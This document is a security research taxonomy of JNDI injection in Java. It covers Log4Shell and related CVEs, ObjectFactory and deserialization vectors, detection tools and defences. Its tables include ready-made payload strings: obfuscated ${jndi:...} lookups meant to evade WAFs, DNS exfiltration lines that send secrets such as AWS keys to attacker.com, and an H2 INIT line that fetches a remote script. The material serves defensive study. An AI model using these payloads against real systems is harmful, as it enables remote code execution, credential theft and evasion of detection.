# JNDI Injection Mutation/Variation Taxonomy

---

## Classification Structure

JNDI (Java Naming and Directory Interface) Injection is a vulnerability class that exploits Java's name-to-object resolution mechanism. When attacker-controlled input reaches a `javax.naming.Context.lookup()` call — directly or through intermediary components like Log4j's message lookup — the attacker can redirect resolution to a malicious naming/directory service and ultimately achieve code execution on the target.

The mutation space of JNDI injection is organized along three orthogonal axes:

**Axis 1 — Code Execution Mechanism (Primary):** What technique achieves code execution *after* a JNDI lookup resolves to an attacker-controlled server. This is the primary structural axis because Java's security patches progressively closed execution vectors, forcing attackers to discover new mechanisms. The evolution from remote codebase loading (pre-2017) to ObjectFactory abuse (2018–2019) to deserialization gadgets and JDBC exploitation (2020–present) defines the core mutation trajectory.

**Axis 2 — Resolution Protocol (Cross-cutting):** Which JNDI service provider (LDAP, RMI, DNS, CORBA/IIOP) transports the malicious object. Each protocol has different serialization semantics, trust boundaries, and restriction timelines, creating a protocol × mechanism matrix.

**Axis 3 — Injection Surface (Mapping):** How attacker-controlled input reaches the `lookup()` call. This ranges from log message injection (Log4Shell) to JDBC URL parameters, REST API inputs, configuration files, and deserialization-triggered lookups. This axis maps techniques to real-world exploitation scenarios.

### Axis 2 Summary: Resolution Protocol Properties

| Protocol | Object Types Supported | Remote Codebase | Restriction Version | Key Property |
|----------|----------------------|-----------------|--------------------|----|
| **RMI** | Serialized, Reference | Yes (pre-8u121) | JDK 7u21+ / 8u121+ | `java.rmi.server.useCodebaseOnly` |
| **LDAP** | Serialized, Reference, Attributes | Yes (pre-8u191) | JDK 6u141 / 7u131 / 8u121+ (codebase), 8u191 (full) | `com.sun.jndi.ldap.object.trustURLCodebase` |
| **DNS** | Limited (exfiltration only) | N/A | None | N/A |
| **CORBA/IIOP** | Serialized, IOR | Yes | Security Manager dependent | N/A |

### Fundamental Mechanism

All JNDI injection variants share a common primitive: the attacker causes the victim application to perform a JNDI lookup against an attacker-controlled naming service. The lookup URL follows the pattern:

```
{protocol}://{attacker-server}:{port}/{path}
```

The attacker's server then returns a crafted response whose processing triggers code execution. The *type* of response and the *mechanism* by which it triggers execution define the primary taxonomy categories below.

---

## §1. Remote Codebase Loading (Classic Vector)

The original and simplest JNDI exploitation mechanism. The attacker's naming service returns a `Reference` object specifying a remote codebase URL. The victim JVM downloads and instantiates a class from this remote location, executing attacker-controlled bytecode.

### §1-1. LDAP Remote Reference Loading

The attacker operates a rogue LDAP server that returns an LDAP entry with `javaCodeBase`, `javaFactory`, and `objectClass=javaNamingReference` attributes pointing to an attacker-hosted HTTP server serving a malicious `.class` file.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Direct codebase reference** | LDAP entry specifies `javaCodeBase=http://attacker/` and `javaFactory=Exploit`; victim downloads and instantiates `Exploit.class` | JDK < 8u191 with `trustURLCodebase=true` (default before 8u191) |
| **LDAP referral redirect** | Rogue LDAP responds with a referral to an HTTP server (via tools like marshalsec); victim follows referral and loads class | JDK < 8u191; referral following enabled |

### §1-2. RMI Remote Reference Loading

The attacker operates a rogue RMI registry that returns a `Reference` object with a remote codebase.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **RMI codebase reference** | RMI registry returns `Reference` with `classFactoryLocation` pointing to HTTP server hosting malicious class | JDK < 8u121 with `useCodebaseOnly=false` (default before 7u21) |
| **RMI-to-LDAP redirect** | RMI registry redirects lookup to LDAP, which then serves the reference (protocol chaining) | JDK < 8u191; depends on both protocol restrictions |

### §1-3. CORBA/IIOP Remote Loading

The attacker exploits CORBA's Interoperable Object Reference (IOR) mechanism to load remote code.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **IOR codebase exploitation** | CORBA naming service returns IOR with remote stub codebase; victim loads class from attacker server | No Security Manager; target supports IIOP protocol |
| **WebLogic T3/IIOP variant** | Attacker sends malicious IIOP request to WebLogic T3 listener triggering JNDI lookup with attacker-controlled IOR (CVE-2020-2551, CVE-2021-35617) | WebLogic with T3/IIOP enabled |

---

## §2. ObjectFactory Abuse (Post-Restriction Bypass)

After Oracle restricted remote codebase loading (JDK 8u191+), exploitation shifted to abusing `ObjectFactory` implementations already present in the target application's classpath. The attacker's naming service returns a `Reference` object specifying a local factory class that, when invoked with attacker-controlled parameters, achieves code execution.

### §2-1. Tomcat BeanFactory + Expression Language

The most widely applicable post-restriction technique. Apache Tomcat's `org.apache.naming.factory.BeanFactory` instantiates arbitrary beans via reflection and invokes methods specified through the `forceString` attribute.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **ELProcessor eval (javax.el)** | `BeanFactory` creates `javax.el.ELProcessor` instance; `forceString` maps a property to `eval`; attacker-supplied EL expression executes arbitrary code via Nashorn/JavaScript engine | Tomcat < 9.0.63 / 8.5.79; `javax.el` on classpath; Java < 15 (Nashorn) |
| **ELProcessor eval (jakarta.el)** | Same technique targeting `jakarta.el.ELProcessor` after the Java EE → Jakarta namespace migration | Tomcat 10.x < 10.1.0-M14; Jakarta EL on classpath |
| **JShell eval (Java 15+)** | After Nashorn removal in Java 15, uses `jdk.jshell.JShell.create().eval()` as the EL execution target | Java 15+; JShell module accessible |
| **GroovyShell evaluate** | `BeanFactory` invokes `groovy.lang.GroovyShell.evaluate()` with attacker-controlled Groovy script | Groovy on classpath; Tomcat < 9.0.63 / 8.5.79 |
| **SnakeYAML load** | `BeanFactory` invokes `org.yaml.snakeyaml.Yaml.load()` with malicious YAML triggering deserialization chain | SnakeYAML on classpath; unpatched BeanFactory |
| **MVEL exec** | `BeanFactory` invokes `org.mvel2.sh.ShellSession.exec()` to execute MVEL expressions | MVEL2 on classpath |
| **BeanShell eval** | `BeanFactory` invokes `bsh.Interpreter.eval()` for BeanShell script execution | BeanShell on classpath |
| **XStream fromXML** | `BeanFactory` invokes `com.thoughtworks.xstream.XStream.fromXML()` with malicious XML payload | XStream on classpath |

> **Note:** Tomcat versions 10.1.0-M14+, 10.0.21+, 9.0.63+, and 8.5.79+ removed the `forceString` attribute from `BeanFactory`, blocking all subtypes in this category on patched Tomcat installations.

### §2-2. MemoryUserDatabaseFactory (Arbitrary File Write)

A Tomcat-specific `ObjectFactory` (`org.apache.catalina.users.MemoryUserDatabaseFactory`) that can be abused for arbitrary file write leading to RCE.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Path manipulation file write** | Attacker controls `pathname` property; `open()` fetches XML from remote URL; `save()` writes to disk after `isWriteable()` bypass via crafted path like `http://attacker/../../target.xml` | Writable CWD; two sequential JNDI lookups; JSP execution context |
| **Directory creation primitive** | Uses `org.apache.velocity.texen.util.FileUtil.mkdir()` via `BeanFactory` to create directory structure needed for path traversal in the write step | Velocity on classpath; sequential exploitation |

### §2-3. WebSphere-Specific ObjectFactories

IBM WebSphere Application Server includes proprietary `ObjectFactory` implementations that can be abused.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **ClientJ2CCFFactory abuse** | Exploits `com.ibm.ws.client.applicationclient.ClientJ2CCFFactory` as an alternative ObjectFactory for achieving code execution | IBM WebSphere on classpath |

### §2-4. JDBC DataSource Factories

DataSource `ObjectFactory` implementations create database connections using attacker-controlled JDBC URLs, which can trigger secondary exploitation vectors.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Tomcat DBCP DataSource** | `org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory` creates a DataSource with attacker-controlled JDBC URL | Tomcat DBCP on classpath |
| **Druid DataSource** | `com.alibaba.druid.pool.DruidDataSourceFactory` connects to attacker-controlled database | Alibaba Druid on classpath |
| **HikariCP DataSource** | `com.zaxxer.hikari.HikariJNDIFactory` creates HikariCP pool with malicious JDBC URL | HikariCP on classpath |
| **Tomcat JDBC Pool + initSQL** | `org.apache.tomcat.jdbc.pool.DataSourceFactory` with `initSQL` attribute executes SQL on connection initialization | Tomcat JDBC Pool on classpath; HSQLDB/H2 as target DB |

---

## §3. Deserialization Gadget Chains

When the attacker's JNDI server returns a serialized Java object (via LDAP's `javaSerializedData` attribute or RMI's native serialization), the victim deserializes it. If exploitable gadget chain classes exist on the classpath, arbitrary code execution follows.

### §3-1. LDAP Serialized Object Delivery

The rogue LDAP server returns an entry with `javaClassName` and `javaSerializedData` attributes containing a serialized gadget chain payload.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Commons Collections chains** | Serialized `CommonsCollections1–7` (ysoserial) payloads delivered via LDAP `javaSerializedData` | Apache Commons Collections 3.x/4.x on classpath; no global deserialization filter |
| **CommonsBeanutils chain** | `CommonsBeanutils1` gadget exploiting `BeanComparator` → `TemplatesImpl` | Commons BeanUtils on classpath |
| **Spring Framework chains** | Spring-specific gadget chains (e.g., `Spring1`, `Spring2` from ysoserial) | Spring Framework on classpath |
| **Hibernate chains** | `Hibernate1/2` gadgets exploiting Hibernate's internal proxying | Hibernate on classpath |
| **Generic serialized payload** | Pre-generated serialized payloads loaded from file and delivered without ysoserial dependency | Any deserializable gadget chain on classpath |

### §3-2. RMI Serialized Object Delivery

RMI inherently uses Java serialization. The rogue RMI registry returns a serialized object containing a gadget chain.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Direct RMI deserialization** | RMI registry returns serialized gadget payload; victim deserializes upon receiving | Gadget chain on classpath; all JDK versions (RMI always deserializes) |
| **RMI DGC exploitation** | Exploiting RMI Distributed Garbage Collection mechanism's deserialization surface | RMI DGC active; older JDK versions |

### §3-3. LDAP javaReferenceAddress Bypass

A technique to bypass higher JDK version LDAP deserialization restrictions by using the `javaReferenceAddress` attribute instead of `javaSerializedData`.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **ReferenceAddress deserialization** | Embeds serialized data within `javaReferenceAddress` attribute, bypassing restrictions that only check `javaSerializedData` | Specific JDK versions with incomplete restriction coverage |

### §3-4. Post-Java 16 Gadget Constraints

Java 16+ introduced strong encapsulation that removed access to many traditional deserialization sinks (e.g., `TemplatesImpl`), forcing evolution toward alternative chains.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **JDBC DataSource getConnection() chains** | Serialized `DataSource` object triggers `getConnection()` on deserialization, chaining into JDBC-based exploitation (§4) | Serializable DataSource + JDBC driver on classpath; Java 16+ |
| **Non-reflective gadget chains** | Gadgets avoiding `setAccessible()` and other reflection that Java 16+ restricts | Application-specific classpath analysis required |

---

## §4. JDBC Connection Exploitation

When a JNDI lookup returns a `DataSource` object (via ObjectFactory or deserialization), the subsequent `getConnection()` call initiates a JDBC connection to an attacker-controlled database server. Certain database drivers support features that can be weaponized for code execution.

### §4-1. H2 Database INIT Script Execution

H2's JDBC driver supports an `INIT` parameter that executes SQL on connection establishment. Combined with H2's `CREATE ALIAS` for arbitrary Java method invocation, this achieves RCE.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **H2 INIT script RCE** | JDBC URL contains `INIT=RUNSCRIPT FROM 'http://attacker/evil.sql'`; SQL script creates a Java alias that calls `Runtime.exec()` | H2 driver on classpath; DataSource factory or deserialized DataSource |
| **H2 in-memory chaining** | Creates in-memory H2 instance, loads INIT script via HTTP, executes embedded Java code | H2 driver + pooling library (DBCP, HikariCP) |

### §4-2. HSQLDB Static Method Invocation

Pre-patch HSQLDB (< 2.7.1) allowed calling arbitrary static Java methods from SQL, enabling a two-stage exploitation.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **HSQLDB CALL + JNDI re-entry** | First SQL statement sets `trustURLCodebase=true` via `System.setProperty()`; second statement calls `InitialContext.doLookup()` to re-trigger JNDI with remote classloading now enabled | HSQLDB < 2.7.1; Tomcat JDBC pool with `initSQL` support |
| **Direct static method execution** | SQL `CALL` statement directly invokes `java.lang.Runtime.exec()` | HSQLDB < 2.7.1 (pre-CVE-2022-41853) |

### §4-3. Other JDBC Driver Exploitation

Various JDBC drivers contain features exploitable through attacker-controlled connection strings.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **PostgreSQL socketFactory** | JDBC URL parameter `socketFactory` / `socketFactoryArg` can instantiate arbitrary classes | PostgreSQL JDBC driver on classpath |
| **MySQL connector deserialization** | MySQL driver's `autoDeserialize=true` combined with `queryInterceptors` triggers deserialization of server-returned data | MySQL Connector/J on classpath |
| **Databricks JDBC krbJAASFile** | `krbJAASFile` parameter in JDBC URL enables arbitrary file reads or command injection (CVE-2024-49194) | Databricks JDBC driver < 2.6.40 |

---

## §5. Injection Surface Mutations (Axis 3 Detail)

This section details how attacker-controlled input reaches the JNDI `lookup()` call — the entry points that enable all mechanisms described in §1–§4.

### §5-1. Log Message Injection (Log4Shell Family)

Log4j 2.x (2.0-beta9 through 2.14.1) performed JNDI lookups within log message strings via the `${jndi:...}` pattern, creating the most impactful injection surface in JNDI history.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Direct log injection** | Attacker-controlled string (HTTP header, parameter, etc.) containing `${jndi:ldap://attacker/x}` is logged by Log4j, triggering lookup | Log4j 2.0-beta9 to 2.14.1 |
| **Nested lookup injection** | JNDI payload embedded within another lookup: `${jndi:${lower:l}dap://attacker/x}` | Log4j 2.x with lookup processing enabled |
| **Configuration-level lookup** | JNDI expressions in Log4j configuration files (XML, properties) that reference attacker-influenced values | Log4j 2.x; attacker can modify config or environment variables |
| **Thread Context Map injection** | JNDI payload injected via MDC/ThreadContext values that are later interpolated in pattern layout | Log4j 2.x with pattern layout using `%X` or `%mdc` |

### §5-2. Direct API Parameter Injection

User-controlled input passed directly as argument to `InitialContext.lookup()`, `Context.lookup()`, or equivalent methods.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **REST API parameter to lookup()** | Unvalidated user input from HTTP request reaches JNDI lookup (e.g., IBM ODM CVE-2024-22319) | Application passes user input to JNDI without validation |
| **JDBC URL parameter injection** | User-controlled JDBC connection string parameters processed by DataSource initialization | Application allows user-supplied JDBC URLs |
| **JMX/MBean attribute injection** | JMX operations that perform JNDI lookups with user-supplied names | JMX exposed; MBean operations accept external input |

### §5-3. Deserialization-Triggered Lookup

A deserialization vulnerability triggers a secondary JNDI lookup, chaining two vulnerability classes.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Fastjson autotype + JNDI** | Fastjson's autotype deserialization creates objects that trigger JNDI lookups (e.g., `JdbcRowSetImpl.setDataSourceName()`) | Fastjson with autotype enabled |
| **Jackson polymorphic + JNDI** | Jackson's polymorphic deserialization instantiates JNDI-capable classes | Jackson with default typing enabled |
| **XMLDecoder + JNDI** | XML deserialization creates `InitialContext` and calls `lookup()` | XMLDecoder processing untrusted input |

### §5-4. Application Server Protocol Injection

Application server proprietary protocols (T3, IIOP) that internally perform JNDI operations.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **WebLogic T3 protocol** | Malicious T3 request triggers JNDI lookup with attacker-controlled name on WebLogic server | WebLogic T3 protocol exposed |
| **WebLogic IIOP protocol** | IIOP request with crafted IOR triggers JNDI resolution (CVE-2020-2551) | WebLogic IIOP enabled |
| **WebLogic OpaqueReference bypass** | Object implementing `OpaqueReference.getReferent()` re-triggers JNDI query, bypassing previous patches (CVE-2024-20931) | WebLogic with incomplete patch for CVE-2023-21839 |

---

## §6. Lookup String Obfuscation (WAF/IDS Evasion)

When JNDI injection occurs through string interpolation engines (primarily Log4j), the lookup string itself can be obfuscated to evade pattern-matching detection. This is a mutation of the *payload encoding*, orthogonal to the execution mechanism.

### §6-1. Log4j Lookup Nesting

Log4j's variable substitution engine processes nested lookups recursively, enabling infinite obfuscation combinations.

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **Case conversion** | `${lower:X}` / `${upper:x}` converts character case, breaking signature matching | `${${lower:j}ndi:${lower:l}dap://x/y}` |
| **Default value substitution** | `${::-X}` returns default value `X` when lookup key is empty | `${${::-j}${::-n}${::-d}${::-i}:ldap://x/y}` |
| **Multiple colon padding** | Extra colons in default syntax: `${::::::-X}` still resolves to `X` | `${${::::::-j}ndi:ldap://x/y}` |
| **Environment variable fallback** | `${env:NONEXISTENT:-j}` returns default `j` when env var doesn't exist | `${${env:NOP:-j}ndi:${env:NOP:-l}dap://x/y}` |
| **Date format extraction** | `${date:'j'}` in date lookup format extracts literal character | `${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://x/y}` |
| **Recursive nesting** | Multiple levels of nested lookups | `${${lower:${lower:jndi}}:${lower:ldap}://x/y}` |
| **sys/env property embedding** | System property or environment variable lookups inserted mid-string | `${j${sys:invalid:-n}di:ldap://x/y}` |

### §6-2. Protocol Scheme Obfuscation

Obfuscating the protocol identifier within the JNDI URL.

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **Mixed case protocol** | JNDI protocol handlers may be case-insensitive | `${jndi:LDAP://x/y}`, `${jndi:Ldap://x/y}` |
| **Protocol substitution** | Using alternative JNDI protocols to bypass LDAP-specific rules | `${jndi:rmi://x/y}`, `${jndi:dns://x/y}`, `${jndi:iiop://x/y}` |
| **LDAPS variant** | LDAP over TLS as an alternative scheme | `${jndi:ldaps://x/y}` |

### §6-3. URL/Host Obfuscation

Obfuscating the destination server address within the JNDI URL.

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **IPv6 encoding** | Using IPv6 address format to bypass IPv4-based blocklists | `${jndi:ldap://[::1]/x}` |
| **URL fragment confusion** | `java.net.URI.getHost()` returns value before `#` but LDAP resolver uses full hostname | `${jndi:ldap://127.0.0.1#attacker.com/x}` |
| **Decimal/octal IP** | IP address encoding alternatives | `${jndi:ldap://0x7f000001/x}` |
| **DNS rebinding** | Hostname resolves to allowed IP initially, then to attacker IP on subsequent resolution | `${jndi:ldap://rebind.attacker.com/x}` |
| **Unicode character tricks** | Unicode characters that normalize to ASCII equivalents in certain parsers | `${lower:jnd}${lower:${upper:ı}}:ldap://x/y` (Turkish dotless i) |

### §6-4. Encoding Layer Obfuscation

Standard encoding transforms applied at the transport layer.

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **URL encoding** | Percent-encoding of JNDI string within HTTP parameters | `%24%7Bjndi%3Aldap%3A%2F%2Fx%2Fy%7D` |
| **Double URL encoding** | Layered percent-encoding to bypass single-decode WAFs | `%2524%257Bjndi...` |
| **Base64 in headers** | JNDI payload within Base64-encoded header values (Authorization, etc.) | Base64-encoded `${jndi:ldap://x/y}` in header |
| **HTML entity encoding** | For web-based injection points | `&#36;&#123;jndi:ldap://x/y&#125;` |

---

## §7. Data Exfiltration via JNDI

Beyond code execution, JNDI injection (particularly via Log4Shell) enables data extraction through DNS/LDAP callback channels.

### §7-1. DNS-Based Exfiltration

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **Environment variable leak** | Embed `${env:VAR}` within JNDI hostname; value appears in DNS query | `${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.attacker.com/x}` |
| **System property leak** | Embed `${sys:PROP}` to extract Java system properties | `${jndi:ldap://${sys:java.version}.attacker.com/x}` |
| **Java runtime info** | Extract JVM metadata via `${java:X}` lookups | `${jndi:dns://${java:os}.attacker.com/x}` |
| **Hostname/user extraction** | Extract server identity | `${jndi:ldap://${env:HOSTNAME}.${env:USER}.attacker.com/x}` |

### §7-2. Exception-Based Extraction

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Invalid lookup exception** | `${java:${env:FLAG}}` triggers exception containing the variable value in the error message | Error messages visible in response or logs |
| **Regex conditional extraction** | `%replace{${env:FLAG}}{^pattern.*}{${error}}` triggers error only on pattern mismatch, enabling binary search | Log4j pattern layout with `%replace`; timing or error observation |
| **ReDoS timing side-channel** | Crafted regex causes exponential backtracking when pattern matches, creating timing oracle | Log4j + observable response time differences |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories | Impact |
|----------|-------------|---------------------------|--------|
| **Log4Shell (Internet-facing)** | Any Java app using Log4j 2.x logging user input | §1/§2/§3 + §5-1 + §6 | RCE, data exfiltration, lateral movement |
| **WebLogic exploitation** | Oracle WebLogic with T3/IIOP exposed | §1-3 + §3 + §5-4 | RCE, server takeover |
| **JDBC parameter injection** | App accepting user-controlled JDBC URLs | §4 + §5-2 | RCE via DB driver features |
| **Deserialization chain** | App with Fastjson/Jackson deserialization + JNDI-capable classes | §1/§2/§3 + §5-3 | RCE via chained vulnerabilities |
| **Internal service exploitation** | JNDI lookup in internal API without input validation | §2 + §5-2 | RCE, internal network pivot |
| **Cloud metadata harvesting** | Log4Shell in cloud-deployed application | §7 + §5-1 | AWS keys, instance metadata, secrets |
| **WAF bypass attack** | Log4Shell with signature-based WAF in front | §1/§2/§3 + §6 | RCE despite perimeter defense |

---

## CVE / Bounty Mapping (2020–2025)

| Mutation Combination | CVE / Case | Impact |
|---------------------|-----------|--------|
| §5-1 + §1-1 + §6 | **CVE-2021-44228** (Log4j — Log4Shell) | CVSS 10.0. Remote codebase loading via log message JNDI injection. Most impactful Java vulnerability in history |
| §5-1 (bypass of 44228 fix) | **CVE-2021-45046** (Log4j 2.15.0) | CVSS 9.0. Bypass via `${jndi:ldap://127.0.0.1#attacker.com/x}` in non-default configs |
| §5-1 (recursive lookup) | **CVE-2021-45105** (Log4j 2.16.0) | CVSS 5.9. DoS via uncontrolled recursion in lookup evaluation |
| §5-1 (config lookup) | **CVE-2021-44832** (Log4j 2.17.0) | CVSS 6.6. RCE via JDBC Appender with attacker-controlled config |
| §5-4 (IIOP + JNDI) | **CVE-2020-2551** (WebLogic) | Unauthenticated RCE via IIOP protocol JNDI lookup |
| §5-4 (T3 + JNDI) | **CVE-2021-35617** (WebLogic) | RCE via T3/IIOP protocol JNDI exploitation |
| §5-4 (OpaqueReference) | **CVE-2024-20931** (WebLogic) | Bypass of CVE-2023-21839 patch via `OpaqueReference.getReferent()` re-triggering JNDI |
| §5-2 (REST API) | **CVE-2024-22319** (IBM ODM) | Unauthenticated RCE via JNDI injection in unprotected REST API |
| §5-2 (JDBC URL) | **CVE-2024-49194** (Databricks JDBC) | CVSS 7.3. Command injection via `krbJAASFile` JDBC URL parameter |
| §2 + §5-2 | **CVE-2025-58782** (Apache Jackrabbit) | JNDI injection in `JndiRepositoryFactory`; RCE via ObjectFactory abuse |
| §4-2 (HSQLDB) | **CVE-2022-41853** (HSQLDB) | Arbitrary static method invocation from SQL, used in JNDI chains |
| §5-3 (Fastjson) | **CVE-2022-25845** (Fastjson) | Autotype bypass enabling JNDI-triggering object deserialization |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **JNDI-Injection-Exploit** (Offensive) | Basic JNDI exploitation testing | Starts RMI/LDAP/HTTP servers; generates payload URLs for common vectors |
| **JNDI-Exploit-Kit** (Offensive) | Extended exploitation with ysoserial integration | Modified JNDI-Injection-Exploit with full ysoserial payload support and dynamic command execution |
| **JNDI-Injection-Exploit-Plus** (Offensive) | Comprehensive gadget testing | 80+ gadget chains (30 more than ysoserial); covers BeanFactory, DataSource, and deserialization vectors |
| **JNDIMap** (Offensive) | High-version JDK bypass testing | Supports RMI/LDAP/LDAPS with multiple bypass methods for modern JDK restrictions |
| **ROGUE JNDI NG** (Offensive) | Advanced rogue JNDI server | Flexible script payloads (JS/Groovy/JShell); generic serialized payload support; H2/HSQLDB exploitation |
| **marshalsec** (Offensive) | LDAP/RMI referral server | Creates referral-based redirect chains for class loading exploitation |
| **rogue-jndi** (Offensive) | Malicious LDAP server | Veracode's rogue LDAP server for JNDI injection testing |
| **ysoserial** (Offensive) | Deserialization payload generation | Generates serialized gadget chain payloads for delivery via JNDI |
| **Java-Chains** (Offensive) | Unified Java exploitation framework | Modular JNDI chain testing with DNSLog-based detection for batch verification |
| **log4j-scan** (Defensive) | Log4Shell detection | Scans for Log4j JNDI injection via callback-based verification |
| **Splunk JNDI Detection** (Defensive) | Log-based detection | Signature rules for `${jndi:` patterns with obfuscation awareness |
| **ExtraHop RevealX** (Defensive) | Network-level detection | Detects JNDI injection attempts via network traffic analysis |
| **OWASP ModSecurity CRS** (Defensive) | WAF-based blocking | Rule set targeting Log4Shell/JNDI patterns with evasion-aware regex |
| **F5 Advanced WAF** (Defensive) | WAF-based blocking | Signatures for BeanFactory gadget and JNDI injection payload patterns |

---

## Summary: Core Principles

### Root Cause

The fundamental property that makes JNDI injection possible is Java's **name-to-object resolution design**: JNDI was architected to transparently convert a string name into a fully instantiated Java object, potentially involving remote network communication, class loading, and deserialization — all triggered by a single `lookup()` call. This design collapses the security boundary between "referencing a name" and "executing arbitrary code," creating an implicit trust relationship between the naming service and the application. Any point where attacker-controlled input reaches a `lookup()` call becomes a potential RCE vector.

### Why Incremental Patches Fail

Oracle's progressive restrictions on JNDI (disabling remote codebase in RMI, then LDAP, then restricting deserialization) follow a pattern of closing individual channels while leaving the fundamental mechanism intact. Each patch eliminates one code execution path, but the rich ecosystem of `ObjectFactory` implementations, deserialization gadgets, and JDBC driver features provides an ever-expanding set of alternatives. The `ObjectFactory` interface is particularly problematic: any class implementing this interface that processes attacker-controlled parameters from a `Reference` object becomes a potential gadget, and the Java ecosystem continually introduces new implementations. The Log4Shell family (CVE-2021-44228 → 45046 → 45105 → 44832) demonstrates how even targeted fixes require multiple iterations, as each patch introduces new bypass conditions.

### Structural Solution

A comprehensive defense requires layering: (1) **Eliminate injection surfaces** — never pass user-controlled input to JNDI `lookup()` calls; disable JNDI message lookups in logging frameworks; (2) **Restrict resolution protocols** — allowlist permitted JNDI protocols and destinations at the JVM level; apply global deserialization filters (JEP 290); (3) **Minimize gadget surface** — reduce classpath to only required dependencies; patch or remove known-exploitable `ObjectFactory` implementations (BeanFactory `forceString`, HSQLDB static method calls); (4) **Network-level isolation** — block outbound LDAP/RMI/DNS from application servers to untrusted destinations. The JDK's default-deny posture for `trustURLCodebase` (post-8u191) was the correct architectural direction, but must be complemented by application-level input validation and classpath hygiene to address the remaining ObjectFactory and deserialization vectors.

---

*This document was created for defensive security research and vulnerability understanding purposes.*

---

## References

- Black Hat USA 2016: "A Journey From JNDI/LDAP Manipulation to Remote Code Execution Dream Land" — https://blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
- Veracode Research: "Exploiting JNDI Injections in Java" — https://www.veracode.com/blog/research/exploiting-jndi-injections-java
- MOGWAI LABS: "JNDI Mind Tricks" (December 2024) — https://mogwailabs.de/en/blog/2024/12/jndi-mind-tricks/
- Source Incite: "JNDI Injection RCE via Path Manipulation in MemoryUserDatabaseFactory" (July 2024) — https://srcincite.io/blog/2024/07/21/jndi-injection-rce-via-path-manipulation-in-memoryuserdatabasefactory.html
- Cloudflare: "Exploitation of CVE-2021-44228 and Evolution of WAF Evasion Patterns" — https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/
- VulHub Java Chains: JNDI Module Documentation — https://java-chains.vulhub.org/docs/module/jndi
- HackTricks: "JNDI - Java Naming and Directory Interface & Log4Shell" — https://book.hacktricks.wiki/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell.html
- F5 DevCentral: "Mitigating New Gadget Leveraging JNDI Injection into Remote Code Execution" — https://community.f5.com/kb/technicalarticles/mitigating-new-gadget-leveraging-jndi-injection-into-remote-code-execution-using/282849
- Mbechler: "PSA: Log4Shell and the current state of JNDI Injection" — https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
- CVE-2024-22319 (IBM ODM) — https://www.vicarius.io/vsociety/posts/unveiling-cve-2024-22319-a-novices-journey-of-a-whitebox-pentest-from-nothing-to-everything-jndi-injection-rce-in-ibm-odm
- CVE-2024-49194 (Databricks JDBC) — https://nvd.nist.gov/vuln/detail/CVE-2024-49194
- CVE-2025-58782 (Apache Jackrabbit) — https://securityonline.info/cve-2025-58782-apache-jackrabbit-vulnerability-exposes-systems-to-jndi-injection-and-rce/
- CVE-2020-2551 (WebLogic IIOP) — https://medium.com/@qazbnm456/cve-2020-2551-unauthenticated-remote-code-execution-in-iiop-protocol-via-malicious-jndi-lookup-119bac7c1eb2
- GitHub — JNDI-Injection-Exploit-Plus (80+ gadgets) — https://github.com/cckuailong/JNDI-Injection-Exploit-Plus
- GitHub — JNDIMap (High-version JDK bypass) — https://github.com/X1r0z/JNDIMap
- GitHub — Log4Shell WAF Bypass Payloads — https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
- Intigriti: "Log4Shell (Log4J): Advanced Exploitation Guide" — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-log4shell-log4j
